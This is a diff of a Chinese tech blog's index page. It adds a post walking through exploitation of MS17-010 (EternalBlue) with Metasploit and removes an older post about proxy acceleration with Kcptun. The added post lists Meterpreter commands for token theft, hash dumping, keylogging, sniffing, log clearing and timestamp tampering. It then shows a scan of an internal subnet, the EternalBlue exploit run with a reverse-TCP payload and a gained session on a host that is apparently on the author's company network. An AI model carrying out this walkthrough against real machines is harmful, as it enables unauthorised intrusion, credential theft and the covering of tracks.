@@ -140,6 +140,171 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-life/hack-MS17010" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/29/life/hack-MS17010/">MS17-010漏洞利用</a>
+    </h1>
+  
+
+        
+        <a href="/2017/10/29/life/hack-MS17010/" class="archive-article-date">
+  	<time datetime="2017-10-29T13:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-引言"><a href="#0x01-引言" class="headerlink" title="0x01 引言"></a>0x01 引言</h2><p>2017年4月，网络最为轰动的事件无疑是TheShadowBrokers放出一大批NSA（美国国家安全局）“方程式组织” (Equation Group)使用的极具破坏力的黑客工具，其中包括可以远程攻破全球约70%Windows机器的漏洞利用工具。一夜之间，全世界70%的windows服务器置于危险之中，国内使用windows服务器的高校、国企甚至政府机构也不能幸免。这对互联网无疑造成了一次大地震，因为已经很久没有出现过像MS17-010这种级别的漏洞了，因此就被大家笑语说出了“指哪打哪”这样一个事实。</p>
+<p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p>
+<h2 id="0x02-前置知识"><a href="#0x02-前置知识" class="headerlink" title="0x02 前置知识"></a>0x02 前置知识</h2><h3 id="MSFconsole-Commands"><a href="#MSFconsole-Commands" class="headerlink" title="MSFconsole Commands"></a>MSFconsole Commands</h3><ul>
+<li>show exploits 查看所有exploit</li>
+<li>show payloads 查看所有payload</li>
+<li>show auxiliary 查看所有auxiliary</li>
+<li>search name 搜索exploit等</li>
+<li>info 查看加载模块的信息</li>
+<li>use name 加载模块</li>
+<li>LHOST 本机IP</li>
+<li>RHOST 目标IP</li>
+<li>set function 设置选项值</li>
+<li>setg function 全局设置</li>
+<li>show options 查看选项</li>
+<li>show targets 查看exp可选的平台</li>
+<li>set target num 设置exp作用平台</li>
+<li>set payload payload 设置payload</li>
+<li>show advanced 查看高级选项</li>
+<li>set autorunscript migrate -f 设置自动执行指令</li>
+<li>check 测试是否可利用</li>
+<li>exploit 执行exp或模块</li>
+<li>exploit -j 作为后台执行</li>
+<li>exploit -z 成功后不立即打开session</li>
+<li>exploit -e encoder 指定encoder</li>
+<li>exploit -h 查看帮助信息</li>
+<li>sessions -l -v 列出可用sessions详细信息</li>
+<li>sessions -s script 在指定session执行脚本</li>
+<li>sessions -K 结束session</li>
+<li>sessions -c cmd 执行指定命令</li>
+<li>sessions -u sessionID 升级shell</li>
+<li>db_create name 创建数据库</li>
+<li>db_connect name 连接数据库</li>
+<li>db_nmap nmap扫描并导入结果</li>
+<li>db_autopwn -h 查看autopwn帮助</li>
+<li>db_autopwn -p -r -e 基于端口，反弹shell</li>
+<li>db_destroy 删除数据库</li>
+</ul>
+<h3 id="Meterpreter-Commands"><a href="#Meterpreter-Commands" class="headerlink" title="Meterpreter Commands"></a>Meterpreter Commands</h3><ul>
+<li>help 查看帮助</li>
+<li>run scriptname 运行脚本</li>
+<li>sysinfo 系统基本信息</li>
+<li>ls 列目录</li>
+<li>use priv 运行提权组件</li>
+<li>ps 列进程</li>
+<li>migrate PID PID迁移</li>
+<li>use incognito token窃取</li>
+<li>list_tokens -u 查看可用用户token</li>
+<li>list_tokens -g 查看可用组token</li>
+<li>impersonate_token DOMAIN_NAME\USERNAME 模仿token</li>
+<li>steal_token PID 窃取PID所属token并模仿</li>
+<li>drop_token 停止模仿token</li>
+<li>getsystem 获取SYSTEM权限</li>
+<li>shell 运行shell</li>
+<li>execute -f cmd.exe -i 交互式运行cmd</li>
+<li>execute -f cmd.exe -i -t 使用可用token运行</li>
+<li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li>
+<li>rev2self 返回至初始用户</li>
+<li>reg command 修改注册表</li>
+<li>setkesktop number 切换至另一已登录用户屏幕</li>
+<li>screenshot 截屏</li>
+<li>upload file 上传文件</li>
+<li>download file 下载文件</li>
+<li>keyscan_start 开始截取击键记录</li>
+<li>keyscan_stop 停止截取击键记录</li>
+<li>getprivs 尽可能提升权限</li>
+<li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li>
+<li>background 将当前meterpreter shell转入后台</li>
+<li>hashdump 导出所有用户hash</li>
+<li>use sniffer 加载嗅探模块</li>
+<li>sniffer_interfaces 查看可用网卡接口</li>
+<li>sniffer_dump interfaceID pcapname 开始嗅探</li>
+<li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li>
+<li>sniffer_stats interfaceID 抓取统计信息</li>
+<li>sniffer_stop interfaceID 停止嗅探</li>
+<li>add_user username password -h ip 添加用户</li>
+<li>add_group_user “Domain Admins” username -h ip 添加用户至管理组</li>
+<li>clearev 清空日志</li>
+<li>timestomp 改变文件属性如创建时间等</li>
+<li>reboot 重启</li>
+</ul>
+<h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><h3 id="运行MSF"><a href="#运行MSF" class="headerlink" title="运行MSF"></a>运行MSF</h3><p><img src="/img/hack/Screenshot - 2017-9-29 17.03.04.png" alt="step01"></p>
+<h3 id="搜索目标"><a href="#搜索目标" class="headerlink" title="搜索目标"></a>搜索目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                      Disclosure Date  Rank     Description</span><br><span class="line">   ----                                      ---------------  ----     -----------</span><br><span class="line">   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection</span><br><span class="line">   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   CHECK_DOPU  <span class="literal">true</span>             yes       Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   RHOSTS                       yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT       445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain   .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                      no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                      no        The username to authenticate as</span><br><span class="line">   THREADS     1                yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.6.100-192.168.6.170</span><br><span class="line">RHOSTS =&gt; 192.168.6.100-192.168.6.170</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> THREADS 8</span><br><span class="line">THREADS =&gt; 8</span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 192.168.6.100:445     - An SMB Login Error occurred <span class="keyword">while</span> connecting to the IPC$ tree.</span><br><span class="line">[-] 192.168.6.105:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.112:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 14 of 71 hosts (19% complete)</span><br><span class="line">[-] 192.168.6.115:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.119:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.118:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 20 of 71 hosts (28% complete)</span><br><span class="line">[*] Scanned 22 of 71 hosts (30% complete)</span><br><span class="line">[-] 192.168.6.122:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.133:445     - An SMB Login Error occurred <span class="keyword">while</span> connecting to the IPC$ tree.</span><br><span class="line">[*] Scanned 35 of 71 hosts (49% complete)</span><br><span class="line">[*] Scanned 41 of 71 hosts (57% complete)</span><br><span class="line">[*] Scanned 49 of 71 hosts (69% complete)</span><br><span class="line">[-] 192.168.6.155:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.151:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.156:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 55 of 71 hosts (77% complete)</span><br><span class="line">[+] 192.168.6.160:445     - Host is likely VULNERABLE to MS17-010!  (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[*] Scanned 58 of 71 hosts (81% complete)</span><br><span class="line">[-] 192.168.6.162:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.6.168:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 68 of 71 hosts (95% complete)</span><br><span class="line">[*] Scanned 71 of 71 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+<h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name                Current Setting  Required  Description</span><br><span class="line">   ----                ---------------  --------  -----------</span><br><span class="line">   GroomAllocations    12               yes       Initial number of <span class="built_in">times</span> to groom the kernel pool.</span><br><span class="line">   GroomDelta          5                yes       The amount to increase the groom count by per try.</span><br><span class="line">   MaxExploitAttempts  3                yes       The number of <span class="built_in">times</span> to retry the exploit.</span><br><span class="line">   ProcessName         spoolsv.exe      yes       Process to inject payload into.</span><br><span class="line">   RHOST                                yes       The target address</span><br><span class="line">   RPORT               445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain           .                no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                              no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                              no        (Optional) The username to authenticate as</span><br><span class="line">   VerifyArch          <span class="literal">true</span>             yes       Check <span class="keyword">if</span> remote architecture matches exploit Target.</span><br><span class="line">   VerifyTarget        <span class="literal">true</span>             yes       Check <span class="keyword">if</span> remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.6.160</span><br><span class="line">LHOST =&gt; 192.168.6.160</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.6.158</span><br><span class="line">LHOST =&gt; 192.168.6.158</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOST 192.168.6.160</span><br><span class="line">RHOST =&gt; 192.168.6.160</span><br></pre></td></tr></table></figure>
+<p><img src="/img/hack/Screenshot - 2017-9-29 17.09.38.png" alt="step01"></p>
+<h3 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : �޿�÷</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WorkGroup</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></table></figure>
+<p>截屏,</p>
+<p><img src="/img/hack/Screenshot - 2017-9-29 17.12.33.png" alt="step01"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>公司内网的安全意识还有待提高。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">生活</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全技术</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/10/29/life/hack-MS17010/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-work/work-in-windows" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -865,91 +1030,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/08/22/life/together-819/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-uncategorized/kcptun-for-ss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/25/uncategorized/kcptun-for-ss/">Kcptun加速SS</a>
-    </h1>
-  
-
-        
-        <a href="/2017/06/25/uncategorized/kcptun-for-ss/" class="archive-article-date">
-  	<time datetime="2017-06-25T12:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="vultr-gt-bandwagon"><a href="#vultr-gt-bandwagon" class="headerlink" title="vultr-&gt;bandwagon"></a>vultr-&gt;bandwagon</h2><p>vultr到期了，看到bandwagon的账户里有之前的返利，于是下单买了$19.9套餐。部署好SS之后发现速度好感人，于是找了资料用Kcptun加速。</p>
-<h2 id="Kcptun安装"><a href="#Kcptun安装" class="headerlink" title="Kcptun安装"></a>Kcptun安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/kuoruan/shell-scripts/master/kcptun/kcptun.sh</span><br><span class="line">chmod 500 ./kcptun.sh</span><br><span class="line">./kcptun.sh install</span><br></pre></td></tr></table></figure>
-<h3 id="Kcptun-服务端配置文件"><a href="#Kcptun-服务端配置文件" class="headerlink" title="Kcptun 服务端配置文件"></a>Kcptun 服务端配置文件</h3><blockquote>
-<p>服务器IP:  45.78.<em>.</em><br>端口:  5989<br>加速地址:  127.0.0.1:5050<br>key:  xxxx<br>crypt:  salsa20<br>mode:  fast2<br>mtu:  1350<br>sndwnd:  1024<br>rcvwnd:  1024<br>datashard:  10<br>parityshard:  3<br>dscp:  0<br>nocomp:  false</p>
-</blockquote>
-<h3 id="Kcptun-PC客户端配置文件"><a href="#Kcptun-PC客户端配置文件" class="headerlink" title="Kcptun PC客户端配置文件"></a>Kcptun PC客户端配置文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;                                     </span><br><span class="line">  <span class="attr">"localaddr"</span>: <span class="string">":5050"</span>,               </span><br><span class="line">  <span class="attr">"remoteaddr"</span>: <span class="string">"45.78.*.*:port"</span>,    </span><br><span class="line">  <span class="attr">"key"</span>: <span class="string">"xxx"</span>,                   </span><br><span class="line">  <span class="attr">"crypt"</span>: <span class="string">"salsa20"</span>,                 </span><br><span class="line">  <span class="attr">"mode"</span>: <span class="string">"fast"</span>,                     </span><br><span class="line">  <span class="attr">"mtu"</span>: <span class="number">1350</span>,                        </span><br><span class="line">  <span class="attr">"sndwnd"</span>: <span class="number">1024</span>,                     </span><br><span class="line">  <span class="attr">"rcvwnd"</span>: <span class="number">1024</span>,                     </span><br><span class="line">  <span class="attr">"datashard"</span>: <span class="number">10</span>,                    </span><br><span class="line">  <span class="attr">"parityshard"</span>: <span class="number">3</span>,                   </span><br><span class="line">  <span class="attr">"dscp"</span>: <span class="number">0</span>,                          </span><br><span class="line">  <span class="attr">"nocomp"</span>: <span class="literal">false</span>                     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Kcptun-Android客户端参数"><a href="#Kcptun-Android客户端参数" class="headerlink" title="Kcptun Android客户端参数"></a>Kcptun Android客户端参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=xxx;crypt=salsa20;mode=fast2;mtu=1350;sndwnd=1024;rcvwnd=1024;datashard=10;parityshard=3;dscp=0;remoteaddr=45.78.*.*:port;</span><br></pre></td></tr></table></figure>
-<h2 id="PC上使用"><a href="#PC上使用" class="headerlink" title="PC上使用"></a>PC上使用</h2><h3 id="kcptun客户端"><a href="#kcptun客户端" class="headerlink" title="kcptun客户端"></a>kcptun客户端</h3><p>下载<a href="https://github.com/xtaci/kcptun/releases" target="_blank" rel="noopener">kcptun-windows</a>后，运行命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\client_windows_amd64.exe -c config.txt</span><br></pre></td></tr></table></figure>
-<h3 id="ss客户端"><a href="#ss客户端" class="headerlink" title="ss客户端"></a>ss客户端</h3><p>配置ss客户端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;server&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">  &quot;server_port&quot;: 5050,</span><br><span class="line">  &quot;password&quot;: &quot;xxxx&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;aes-256-cfb&quot;,</span><br><span class="line">  &quot;remarks&quot;: &quot;&quot;,</span><br><span class="line">  &quot;auth&quot;: false,</span><br><span class="line">  &quot;timeout&quot;: 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用Kcptun加速SS后速度非常快，油管1080P流畅看。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">VPS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/25/uncategorized/kcptun-for-ss/">展开全文 >></a>
         </p>
       
 
